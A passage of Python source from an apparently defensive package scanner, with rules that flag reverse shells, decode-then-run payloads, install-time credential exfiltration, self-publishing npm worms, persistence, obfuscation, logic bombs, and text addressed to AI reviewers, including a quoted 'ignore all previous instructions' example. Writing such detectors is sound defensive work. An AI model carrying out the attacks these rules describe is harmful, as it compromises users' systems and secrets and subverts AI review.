    """A reverse shell written over several statements: a socket connected out, then wired to a shell's input and
    output (Python: os.dup2 of the socket onto stdin and stdout; Node: the socket piped into a spawned shell)."""
    sev = "critical" if context == "autoexec" else "high"
    if path.lower().endswith((".py", ".pyw")):
        dup = next(iter(live(_PY_DUP2.finditer(text), 1)), None)
        if dup and _PY_CONNECT.search(text) and _SHELL_SPAWN.search(text):
            col.add(R_REVERSE_SHELL, sev, dup.start(), "connects a socket out and hands it a shell's input and output",
                    context)
    elif path.lower().endswith((".js", ".cjs", ".mjs")):
        shell = next(iter(live(_JS_SHELL.finditer(text), 1)), None)
        if shell and _JS_SOCKET.search(text) and re.search(r"\.pipe\s*\(", text):
            col.add(R_REVERSE_SHELL, sev, shell.start(), "connects a socket out and pipes it to a shell", context)


def _two_step_shapes(col: Collector, text: str, path: str, context: str, low: str, nets: list[int], live) -> None:
    """Shapes whose evidence sits in two statements: data decoded into a variable and then run, host details taken
    and a network call made while installing, a program downloaded, saved and run, and a package that rewrites its
    package.json and publishes itself."""
    auto = context == "autoexec"
    if auto:
        _shell_beacon(col, text, context)
    if has(low, ("dup2", "socket")):
        _reverse_shell(col, text, path, context, live)
    if path.lower().endswith((".py", ".pyw")) and ".write" in text:
        _dropped_code(col, text, path, context)
    for m in live(_STAGED.finditer(text), 20) if has(low, ("decode", "decompress", "unhexlify", "fromhex", "decrypt",
                                                          "base64", "atob")) else ():
        name = re.escape(m.group(1))
        after = text[m.end():m.end() + 5000]
        if re.search(rf"(?:\b(?:exec|eval|execSync|spawnSync)|new\s+Function|\bFunction|vm\.runIn\w+|os\.system|os\.popen|"
                     rf"subprocess\.\w+)\s*\(\s*(?:[\w$]+\.)?{name}\b", after):
            col.add(R_DECODE_EXEC, "critical" if auto else "high", m.start(),
                    f"decodes data into {m.group(1)}, then runs it", context)
            break
    if auto and has(low, ("hostname", "getfqdn", "getuser", "getlogin", "platform.node", "getnode", "userinfo",
                          "networkinterfaces", "getservers")):
        fp = next(iter(live(FINGERPRINT.finditer(text), 1)), None)
        if fp and (nets or _DNS_SEND.search(text)):
            col.add(R_EXFIL, "high", fp.start(), "takes host details (machine or user name, network interfaces, DNS "
                    "servers) and makes a network call while installing", context)
    if path.lower().endswith((".py", ".pyw")) and has(low, ("requests", "urlopen", "urlretrieve", "httpx", "wget")):
        for dl in live(_PY_FETCH.finditer(text), 10):
            # The run follows the download closely and starts a program: `chmod +x`, `./name`, `name.exe`, `start`
            span = text[dl.start():dl.start() + 1500]
            run = _PY_RUN.search(span)
            if run and (_PY_WRITE.search(span) or "urlretrieve" in span) and re.search(
                    r"chmod\s+\+?[0-7x]|0o?7[0-7]{2}|\./|\.exe\b|\bstart\s|startfile", span[:run.end() + 200], re.I):
                col.add(R_DOWNLOAD_EXEC, "critical" if auto else "medium", dl.start(), "downloads a file and runs it",
                        context)
                break
    if has(low, ("publish",)) and "package.json" in low:
        pub = next(iter(live(_NPM_PUBLISH.finditer(text), 1)), None)
        if pub and _PKG_WRITE.search(text):
            spreads = bool(re.search(r"\.name\s*=|setInterval|setTimeout|while\s*\(\s*true", text))
            col.add(R_SELF_PUBLISH, "high" if spreads or auto else "medium", pub.start(),
                    "rewrites package.json and runs npm publish" + (", renaming or repeating itself" if spreads else ""),
                    context)


def scan_text(text: str, path: str, context: str, *, decode: bool = True, structural: bool = True,
              note: str = "", line_offset: int = 0, fold: bool = True) -> list[Finding]:
    """All content rules for one text. Structural checks (invisible characters, padding) run on original text only."""
    col = Collector(path, text, line_offset=line_offset, note=note)
    is_code = context in ("code", "autoexec")
    low = text.lower()
    if structural:
        _structural(col, text, path, context)
    if context in ("doc", "config"):
        # Prose and code examples in documentation are talk about code. The documents agents follow (README, setup
        # guides, AGENTS.md, rules, skills) have their commands extracted and judged separately; here only hidden
        # content and text addressed to AI reviewers count. Structured files that run something are read by their
        # handlers; for the rest (data, results, settings of tools nothing here starts) the same holds.
        for m in AI_ADDRESSED.finditer(text) if has(low, AI_NEED) else ():
            if not _quoted_mention(text, m.start(), m.end()):
                col.add(R_AI_ADDRESSED, AI_SEV.get(context), m.start(), "addresses an AI reviewer or agent", context)
        return col.items
    _apply(COMMAND_PATTERNS, col, text, context, low)

    def live(matches, cap: int = 400) -> list[re.Match]:
        """Matches that can do something: not in whole-line comments, not in strings that are only data."""
        out = []
        for m in matches:
            if not in_comment(text, m.start(), path) and not (is_code and data_string(text, m.start(), path, context)):
                out.append(m)
                if len(out) >= cap:
                    break
        return out

    secrets = list(SECRET_PATHS.finditer(text)) if has(low, SECRET_NEED) else []
    for m in secrets[:6]:
        sev = SECRET_SEV.get(context)
        if sev and rank(sev) > rank("low") and in_comment(text, m.start(), path):
            sev = "low"
        col.add(R_SECRETS, sev, m.start(), "references " + m.group(), context)
    secrets = live(secrets)
    env = next(iter(live(ENV_DUMP.finditer(text), 1)), None) if has(low, ENV_NEED) else None
    if env:
        col.add(R_ENV_DUMP, ENV_SEV.get(context), env.start(), "serializes the environment", context)
    nets: list[int] = []
    if (is_code or context == "config") and has(low, NET_NEED):
        nets = [m.start() for m in live(NETWORK.finditer(text)) if not named_in_string(text, m.start())]
    if not nets and is_code and has(low, ("http", "net.", "dns.")):
        nets = [m.start() for m in live(_NET_FALLBACK.finditer(text)) if not named_in_string(text, m.start())]
    sends = live(SEND_DATA.finditer(text), 50) if nets and context == "autoexec" else []
    if nets and context == "autoexec":
        url_matches = live(URL.finditer(text), 2000)
        foreign = [m for m in url_matches if classify_host(m.group()) not in ("official", "reference")]
        # `http://${HOST}:${port}`: the destination is decided at run time, often a server the script started itself
        templated = [m for m in foreign if _TEMPLATE_HOST.match(m.group())]
        foreign = [m for m in foreign if not _TEMPLATE_HOST.match(m.group())]
        # The request and its destination sit together in a beacon; a reference link elsewhere in the file is not one.
        near = first_near([m.start() for m in sends], [m.start() for m in foreign], 3000)
        near_template = first_near([m.start() for m in sends], [m.start() for m in templated], 3000)
        if near is not None:
            host = host_of(min(foreign, key=lambda m: abs(m.start() - near)).group())
            col.add(R_EXFIL, "high", near, f"sends data out while installing or opening (to {host})", context)
        elif near_template is not None:
            col.add(R_EXFIL, "medium", near_template, "sends data out while installing or opening, to a host decided at "
                    "run time", context)
        elif sends and not url_matches:
            col.add(R_EXFIL, "high", sends[0].start(), "sends data out while installing or opening (to an address "
                    "assembled at run time)", context)
        else:
            # A setup.py that replaces pip's own install steps and talks to the network: popular packages do not
            # (none of 2,000 sampled); install-time stealers and reverse shells do.
            hook = path.lower().endswith("setup.py") and _INSTALL_HOOK.search(text)
            col.add(R_NET_AUTO, "medium" if hook else "low", nets[0], "network call in code that runs automatically"
                    + (", from a setup.py that replaces pip's install steps" if hook else ""), context)
    if is_code:
        _two_step_shapes(col, text, path, context, low, nets, live)
    for m in DOWNLOAD_THEN_RUN.finditer(text) if context in ("autoexec", "code") and has(low, ("curl", "wget")) else ():
        commented = in_comment(text, m.start(), path)
        kind = host_kind(m.group())
        sev = DOWNLOAD_SEVERITY["doc" if commented else context][kind]
        col.add(R_DOWNLOAD_EXEC, sev, m.start(), f"downloads {m.group(1)} and then makes it executable or runs it"
                + HOST_NOTE[kind], context)
        break
    if nets and is_code and has(low, ("exec", "eval", "function", "vm.run", "iex", "invoke-expression")):
        # Fetch, then exec/eval what came back: the two steps are usually a few lines apart, not one expression.
        runs = [m.start() for m in live(DYNAMIC_EXEC.finditer(text), 50)]
        # the fetch comes first and the exec follows within a few lines
        hit = next((r for r in runs if any(0 < r - n <= 800 for n in nets)), None)
        if hit is not None and not col.has(R_DOWNLOAD_EXEC):
            near_net = max(n for n in nets if n < hit)
            kind = host_kind(text[max(0, near_net - 300):near_net + 300])
            sev = DOWNLOAD_SEVERITY[context][kind]
            if kind == "official" and context == "autoexec":
                sev = "high"  # nobody needs to eval a download from an official host at install time
            if context == "code" and kind == "none":
                sev = "low"  # no destination in sight: plugin loaders and test harnesses do this
            col.add(R_DOWNLOAD_EXEC, sev, hit, "fetches code over the network and executes it" + HOST_NOTE[kind], context)
    _exfil_hosts(col, text, context, low)
    _registry(col, text, context, low)
    if is_code and nets and (secrets or env):
        anchors = [m.start() for m in secrets] + ([env.start()] if env else [])
        # Install-time code has no reason to touch credentials at all; elsewhere the read and the send have to be
        # near each other, as they are in a stealer, rather than a keyword list and an HTTP client in one module.
        anchor = first_near(anchors, nets, len(text) if context == "autoexec" and len(text) <= 100_000 else 4000)
        if anchor is not None:
            dest = bool((has(low, EXFIL_NEED) and live(EXFIL_HOSTS.finditer(text), 1))
                        or any(not is_private_ip(m.group(1)) for m in live(RAW_IP_URL.finditer(text), 50)))
            kinds = _secret_kinds(secrets)
            if context == "autoexec":
                sev = "critical"
            elif dest or len(kinds) >= 3:
                sev = "high"
            elif len(kinds) == 2 or (env and live(SEND_DATA.finditer(text), 1)):
                sev = "medium"
            else:
                sev = "low"  # one credential file and a network library: an HTTP client reading ~/.netrc
            col.add(R_EXFIL, sev, anchor, "reads secrets or the environment and makes network requests"
                    + (f" ({len(kinds)} kinds of credentials)" if len(kinds) > 1 else ""), context)
    for m in live(PERSIST.finditer(text), 1) if has(low, PERSIST_NEED) else ():
        col.add(R_PERSIST, PERSIST_SEV.get(context), m.start(), "sets up persistence", context)
    if is_code:
        campaign_shapes(col, text, context, low, live, nets)
    for m in live(AGENT_CONFIG.finditer(text), 50) if is_code and has(low, AGENT_NEED) else ():
        # the write and the path belong to the same statement: this line and its neighbours
        start = text.rfind("\n", 0, text.rfind("\n", 0, m.start())) + 1
        stop = text.find("\n", text.find("\n", m.end()) + 1)
        window = text[start:stop if stop >= 0 else len(text)]
        if not WRITE_OP.search(window):
            continue
        if m.group().lower() == "core.hookspath" and (re.match(r"[\"'`]?\s*(?:\|\||;|&&|\)|$)", text[m.end():m.end() + 40], re.M)
                                                      or re.search(r"--get\b", window)):
            continue  # `git config core.hooksPath || true` reads the setting
        # Changing the agent configuration in your home folder reaches every project and session; a project's own
        # instruction files are its maintainers' business unless install-time code rewrites them.
        home = bool(GLOBAL_HINT.search(window))
        instructions = bool(INSTRUCTION_FILE.search(m.group()))
        if context == "autoexec":
            sev = "critical" if home else ("medium" if instructions else "high")
        else:
            sev = "medium" if home and not instructions else "low"
        if context == "code" and re.match(r"(?i)\.git[\\/]hooks|core\.hooksPath|\.vscode", m.group()):
            sev = "low"  # git-hook managers and editor tooling write these as their job
        col.add(R_AGENT_CFG_WRITE, sev, m.start(), "writes " + m.group() + (" in your home folder" if home else ""), context)
        break
    for m in AI_ADDRESSED.finditer(text) if has(low, AI_NEED) else ():
        if context == "code" and not in_comment(text, m.start(), path):
            continue
        literal = enclosing_string(text, m.start()) if is_code else None
        if literal is not None and (REGEX_LIKE.search(literal) or (context == "code" and is_test_code(path))):
            continue  # a detection pattern or a test input, not a message to a reviewer
        if _quoted_mention(text, m.start(), m.end()):
            continue  # an example being warned about: 'if a page says "ignore all previous instructions", do not'
        col.add(R_AI_ADDRESSED, AI_SEV.get(context), m.start(), "addresses an AI reviewer or agent", context)
    if is_code:
        obf = OBF_IDENT.findall(text) if "_0x" in low else []
        signature = OBF_SIGNATURE.search(text) if obf else None
        sample = signature is not None and data_string(text, signature.start(), path, context)
        if len(obf) >= 10 and signature:
            col.add(R_OBFUSCATED, "low" if sample else "high", signature.start(), f"obfuscator.io signature ({len(obf)} "
                    "_0x identifiers, string-array rotation or decoded member names)"
                    + (" in a string that is data" if sample else ""), context)
        elif len(obf) >= 25:
            col.add(R_OBFUSCATED, "high" if context == "autoexec" else "medium", text.find(obf[0]),
                    f"{len(obf)} obfuscator-style identifiers", context)
        m = (PACKER.search(text) if has(low, ("eval", "pyarmor")) else None) or (JSFUCK.search(text) if "[]" in text else None)
        if m and not data_string(text, m.start(), path, context):
            col.add(R_OBFUSCATED, "high" if context == "autoexec" else "medium", m.start(), "packed or JSFuck code", context)
        bad = any(f.rule in (R_DOWNLOAD_EXEC, R_DECODE_EXEC, R_EXFIL, R_PERSIST, R_EXFIL_HOST, R_AGENT_BYPASS)
                  and rank(f.severity) >= rank("medium") for f in col.items)
        gated = has(low, ("date", "process.env", "os.environ", "platform", "time.time"))
        cond = next(iter(live(CONDITIONAL.finditer(text), 1)), None) if gated else None
        date_gate = next((m for m in live(FUTURE_DATE_GATE.finditer(text), 20) if _future_gate(m)), None) if gated else None
        if cond and bad:
            col.add(R_CONDITIONAL, "medium", cond.start(), "suspicious code is gated on CI, date or platform", context)
        elif date_gate and nets and cond:
            col.add(R_CONDITIONAL, "high", date_gate.start(), "network code that runs only in CI or after a set date "
                    "(a logic bomb)", context)
        elif date_gate and nets:
            col.add(R_CONDITIONAL, "medium", date_gate.start(), "network code gated on a date that has not come yet", context)
    if is_code and fold and len(text) <= FOLD_LIMIT and (SPLIT_HINT.search(text) or DEOBF_HINT.search(text)):
        # Attackers spell what patterns look for in pieces, character codes, escapes or ROT13, reach members through
        # brackets or getattr, and assemble shell commands from variables. The decoded copy is judged like everything
        # else, and a sensitive name or URL that needed decoding is a sign of its own: legitimate code writes
        # 'https' and 'eval' plainly.
        normal = deobfuscate(text, path)
        # Wrapping a long message in pieces, or naming a tool in a shell variable, is how ordinary code reads; only
        # when the sensitive part is nowhere in plain text did the pieces hide it. Escapes, character codes and ROT13
        # are not how anyone wraps a message, and stay reported whatever else the file spells out.
        flagged = [(pos, value, how) for pos, value, how in decoded_items(text, path) if is_sensitive(value)
                   and not placeholder_url(value)
                   and (how not in ("builds out of pieces", "assembles a command from shell variables")
                        or needed_decoding(value, text, low))
                   and not in_comment(text, pos, path) and not after_trailing_comment(text, pos, path)
                   and not in_other_string(text, pos, path) and not (context == "code" and is_test_code(path))]
        if flagged:
            pos, value, how = flagged[0]
            col.add(R_OBFUSCATED, "critical" if context == "autoexec" else "high", pos,
                    f"{how} {clip(value, 80)!r}" + (f" ({len(flagged)} such values)" if len(flagged) > 1 else ""), context)
        if normal != text:
            known = {(f.rule, f.line): f for f in col.items}
            for f in scan_text(normal, path, context, decode=False, structural=False, note=note, line_offset=line_offset,
                               fold=False):
                same = known.get((f.rule, f.line))
                if same is None:
                    f.message += " (after decoding what the code hides)"
                    col.items.append(f)
                elif rank(f.severity) > rank(same.severity):  # decoding showed more than the disguised text did
                    same.severity, same.message = f.severity, f.message + " (after decoding what the code hides)"
    if is_code:
        alias = next((m for m in live(FUNCTION_ALIAS.finditer(text), 20)
                      if not after_trailing_comment(text, m.start(), path)), None)
        if alias:
            col.add(R_OBFUSCATED, "critical" if context == "autoexec" else "high", alias.start(),
                    "reaches the Function constructor through an alias (runs code without writing eval)", context)
    if decode:
        for blob in decode_blobs(text):
            found = scan_text(blob["text"], path, context if context != "doc" else "code", decode=False,
                              structural=False, note=f"decoded {blob['kind']}: ",
                              line_offset=col.lines.line(blob["pos"]) - 1)
            for f in found:
                f.line = col.lines.line(blob["pos"])
                col.items.append(f)
            if found and not any(f.rule == R_DECODE_EXEC for f in col.items):
                col.add(R_OBFUSCATED, "high" if context == "autoexec" else "medium", blob["pos"],
                        f"{blob['kind']} blob decodes to code flagged above", context)
    return col.items


def _strings_in_test(text: str, path: str, context: str, item: dict) -> bool:
    """Every occurrence sits inside a string literal of a test file: test data for text handling."""
    return context == "code" and is_test_code(path) and all(in_string_literal(text, p) for p in item.get("positions", [item["pos"]]))


BUNDLED = re.compile(r"(?:\.min\.|[-.]bundle\.|\.browser\.|\.umd\.|(?:^|[\\/])(?:dist|build|vendor|umd|bundles?|assets|static|"
                     r"chunks|_next|locales?|i18n|l10n)[\\/])", re.I)


def _strings_in_bundle(text: str, path: str, context: str, item: dict) -> bool:
    """Every occurrence sits in a string in built, vendored or locale files: text the code carries, not code a person
    reads. Bundles keep Unicode tables and translated text that legitimately hold these characters."""
    return context == "code" and bool(BUNDLED.search(path)) and all(
        in_string_literal(text, p) or text.rfind("\n", 0, p) < p - 4000 for p in item.get("positions", [item["pos"]]))


_ZW_RUN = re.compile("[​‌‍⁠-⁤﻿]{8,}")


def _long_run(text: str, item: dict) -> bool:
    """Eight or more zero-width characters in a row that repeat: data spelled out in invisible characters, not text.
    A run where each character appears once is a set of them (a grammar's identifier class), and carries nothing."""
    return any(len(set(m.group())) < len(m.group()) for m in _ZW_RUN.finditer(text))


_TABLE_HINT = re.compile(r"\\u\{?[0-9A-Fa-f]{4,6}\}?|\\x[0-9A-Fa-f]{2}|[^\x00-\x7f]-[^\x00-\x7f]")
_QUOTES = "\"'`"


def _char_table(text: str, item: dict, path: str = "") -> bool:
    """Every occurrence sits in a table of characters: inside a string next to escapes of other characters or ranges
    of non-ASCII letters (a whitespace set, an identifier class in a grammar), or alone in its own string or on its
    own line (a list of named symbols, a dictionary of characters). Text-handling code carries these. Not outside
    strings, where these characters deceive (in names); and a payload spelled out in invisible characters needs a long
    run of them, which is checked separately."""
    for p in item.get("positions", [item["pos"]]):
        before, after = text[p - 1:p], text[p + 1:p + 2]
        if (before and after and before in _QUOTES and after in _QUOTES) or (before in ("\n", "") and after in
                                                                              ("\n", "\r", "")):
            continue
        # In a bundle the strings of a minified line cannot be parsed reliably, and names there deceive nobody.
        in_string = in_string_literal(text, p) or _in_char_class(text, p) or bool(BUNDLED.search(path))
        if not (in_string and _TABLE_HINT.search(text, max(0, p - 60), p + 60)):
            return False
    return True


def _in_char_class(text: str, p: int) -> bool:
    """Inside a bracketed character class on its line, `[...]` of a regular expression or a pattern string."""
    open_at = text.rfind("[", max(0, p - 300), p)
    close_at = text.find("]", p, p + 300)
    return open_at >= 0 and close_at >= 0 and "]" not in text[open_at + 1:p] and "\n" not in text[open_at:close_at]


_DATA_EXT = (".json", ".jsonl", ".txt", ".csv", ".tsv", ".xml", ".yaml", ".yml", ".html", ".htm", ".dat", ".dic")


def _test_data(path: str) -> bool:
    """A data file in a test folder: inputs for text-handling tests, read by tests and nothing else."""
    return path.lower().endswith(_DATA_EXT) and bool(re.search(r"(?:^|/)(?:tests?|testing|testdata|test[-_]data)/", path,
                                                              re.I))


def _structural(col: Collector, text: str, path: str, context: str) -> None:
    is_code = context in ("code", "autoexec")
    for item in invisible(text):
        kind, pos = item["kind"], item["pos"]
        if item.get("decoded") and len(item["decoded"]) >= 8:
            hidden = scan_text(item["decoded"], path, "code" if context == "doc" else context, decode=True,
                               structural=False, note="hidden in invisible characters: ",
                               line_offset=col.lines.line(pos) - 1)
            for f in hidden:
                f.line = col.lines.line(pos)
            col.items.extend(hidden)
        if kind == "tags":
            sev = "critical" if context in ("doc", "config", "autoexec") else "high"
            col.add(R_TAGS, sev, pos, f"{item['count']} tag characters hide: {item['decoded'][:160]!r}", context)
        elif kind == "selectors":
            sev = "high" if item["count"] >= 4 else "medium"
            if is_code and item["count"] >= 4:
                sev = "critical" if context == "autoexec" else "high"
            note = ""
            if _test_data(path) and item["count"] < 8:  # Unicode test cases; a payload this short is not one
                sev, note = "low", " (in a test data file)"
            col.add(R_SELECTORS, sev, pos, f"{item['count']} variation selectors decode to: {item['decoded'][:160]!r}"
                    f"{note}", context)
        elif kind == "bidi":
            sev = "high" if is_code else ("medium" if context in ("doc", "config") else "low")
            note = ""
            if _strings_in_test(text, path, context, item):
                sev, note = "low", " (inside string literals in a test file)"
            elif _test_data(path):
                sev, note = "low", " (in a test data file)"
            elif _strings_in_bundle(text, path, context, item):
                sev, note = "low", " (inside strings in a bundled file)"
            elif _char_table(text, item, path):
                sev, note = "low", " (in a table of characters)"
            col.add(R_BIDI, sev, pos, f"{item['count']} bidirectional control characters{note}", context)
        elif kind == "zero-width":
            sev = ("medium" if item["count"] < 10 else "high") if is_code else "low"
            note = ""
            if _strings_in_test(text, path, context, item):
                sev, note = "low", " (inside string literals in a test file)"
            elif _test_data(path) and not _long_run(text, item):
                sev, note = "low", " (in a test data file)"
            elif _strings_in_bundle(text, path, context, item) and not _long_run(text, item):
                sev, note = "low", " (inside strings in a bundled file)"
            elif not _long_run(text, item) and _char_table(text, item, path):
                sev, note = "low", " (in a table of characters)"
            elif is_code and item["count"] < 10 and not _long_run(text, item) and all(
                    in_string_literal(text, p) for p in item.get("positions", [pos])):
                # A few inside strings are text-handling constants (strip or split on them); deception is in names
                sev, note = "low", " (inside string literals)"
            elif is_code and all(in_comment(text, p, path) for p in item.get("positions", [pos])):
                sev, note = "low", " (in comments)"  # a pasted typo; identifiers are where these deceive
            col.add(R_ZERO_WIDTH, sev, pos, f"{item['count']} zero-width characters{note}", context)
        elif kind == "filler":
            sev, note = ("high" if is_code else "medium"), ""
            spots = {"pos": pos, "positions": [m.start() for m in FILLERS.finditer(text)][:200]}
            if _strings_in_test(text, path, context, spots) or _strings_in_bundle(text, path, context, spots):
                sev, note = "low", " (inside strings in a test or bundled file)"
            elif _test_data(path) or _char_table(text, spots, path):
                sev, note = "low", " (a character in a list or table)"
            col.add(R_ZERO_WIDTH, sev, pos, f"{item['count']} Hangul filler characters (invisible identifiers){note}",
                    context)
    if "\x1b" in text:
        hides = list(TERMINAL_HIDE.finditer(text))
        if hides:
            sev = "high" if context in ("doc", "config", "autoexec") else "medium"
            note = ""
            if context == "code" and is_test_code(path):
                sev, note = "low", " (in a test file)"
            elif path.lower().endswith((".pdf", ".ps", ".eps")) or _test_data(path):
                sev, note = "low", " (in a binary document or test data, which no terminal prints raw)"
            col.add(R_TERMINAL, sev, hides[0].start(), f"{len(hides)} escape codes that conceal, erase or overwrite "
                    f"text{note}", context)
    for item in padding(text, doc=context == "doc"):
        if item["kind"] == "blank-lines":
            sev = "high" if context in ("autoexec", "doc") or item["count"] >= 2000 else "medium"
            col.add(R_PAD_LINES, sev, item["pos"], f"content after {item['count']:,} blank lines", context)
        else:
            sev = "high" if is_code or context == "doc" else "low"  # in data files, wide values are just data
            note = ""
            if context == "code" and is_test_code(path) and in_string_literal(text, item["pos"]):
                sev, note = "low", " (inside a string literal in a test file)"
            col.add(R_PAD_SPACES, sev, item["pos"], f"code after {item['count']:,} spaces{note}", context)
    minified = bool(re.search(r"(?:\.min\.|(?:^|[\\/])(?:dist|build|vendor|umd|bundles?)[\\/])", path, re.I)
                    or BUNDLED.search(path))
    data_file = path.lower().endswith((".map", ".json", ".geojson", ".ndjson", ".jsonl", ".csv", ".tsv", ".svg"))
    for pos, length in long_lines(text, 5000):
        if data_file and context != "autoexec":
            sev = "low"  # source maps, JSON and tables are data: one long line is how they are written
        elif length >= 1_000_000:
            # a minified bundle (swagger-ui, a vendored library) is one line; its content is read whole regardless
            sev = "high" if context == "autoexec" else ("low" if minified else "medium")
        elif length >= 100_000 and not minified:
            sev = "medium" if context == "autoexec" else "low"
        else:
            sev = "low" if (context == "autoexec" and not minified) else None
        col.add(R_LONG_LINE, sev, pos, f"one line of {length:,} characters", context,
                evidence=text[pos:pos + 120])
        break
    if path.lower().endswith((".md", ".mdc", ".markdown", ".html", ".htm")):
        from .surfaces import AUTO_LOADED  # instruction files agents load on their own

        auto = bool(AUTO_LOADED.search(path))
        for m in HIDDEN_HTML.finditer(text):
            body = m.group(1)
            addressed = AI_ADDRESSED.search(body)
            if addressed or re.search(r"\b(?:run|execute|install|download|curl|wget|npx|pip install)\b", body, re.I):
                sev = ("high" if addressed else "medium") if auto else ("medium" if addressed else "low")
                col.add(R_HIDDEN_COMMENT, sev, m.start(), "an HTML comment carries instructions", context,
                        evidence=body[:200])
